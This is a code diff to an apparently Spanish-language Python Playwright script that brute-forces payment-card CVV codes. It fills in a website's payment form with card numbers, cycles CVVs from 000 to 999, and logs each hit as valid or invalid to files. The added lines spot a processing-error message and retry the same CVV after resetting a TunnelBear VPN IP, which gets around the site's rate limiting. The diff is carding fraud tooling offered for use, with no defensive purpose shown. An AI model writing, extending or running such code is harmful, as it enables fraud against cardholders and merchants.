@@ -170,6 +170,7 @@ def editar_y_rellenar_pago(page, numero, mes, ano, cvv, nombre_tarjeta="hysteria
 
 def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_intentos):
     """Evalúa el resultado del intento de CVV y toma acciones según el mensaje recibido."""
+    
     if CVV_DOES_NOT_MATCH in mensaje or page.get_by_text(CVV_DOES_NOT_MATCH).is_visible():
         print(Fore.RED + f"\u2716 {numero}|{mes}|{ano}|{cvv} -> CVV INCORRECTO" + Style.RESET_ALL)
         with open(CVV_INVALIDOS_FILE, "a") as f:
@@ -202,11 +203,11 @@ def evaluar_resultado_cvv(mensaje, numero, mes, ano, cvv, page, intento, max_int
         with open(CVV_VALIDOS_FILE, "a") as f:
             f.write(f"{numero}|{mes}|{ano}|{cvv}, posiblemente bloqueada\n")
         return None
+    
+    if "There was an error while processing your request" in mensaje or page.get_by_text("There was an error while processing your request").is_visible():
+        print(Fore.YELLOW + f"RESET IP TUNNEL BEAR SERVICE: {cvv}" + Style.RESET_ALL)
+        return "IP_INVALID"
 
-    print(f"CVV ERROR DESCONOCIDO: {cvv}")
-    with open(CVV_INVALIDOS_FILE, "a") as f:
-        f.write(f"{numero}|{mes}|{ano}|{cvv}\n")
-    return None
 
 
 def toggle_tunnelbear():
@@ -226,6 +227,11 @@ def lanzar_navegador_y_procesar(page, numero, mes, ano, cvv_actual, max_intentos
         if resultado == "MAX_INTENTOS":
             next_cvv = str(int(cvv_actual) + 1).zfill(3) if int(cvv_actual) < 999 else None
             break
+        
+        if resultado == "IP_INVALID":
+            next_cvv = str(int(cvv_actual)).zfill(3) if int(cvv_actual) < 999 else None
+            break
+        
         elif resultado and resultado.isdigit():
             cvv_actual = resultado
             intento += 1
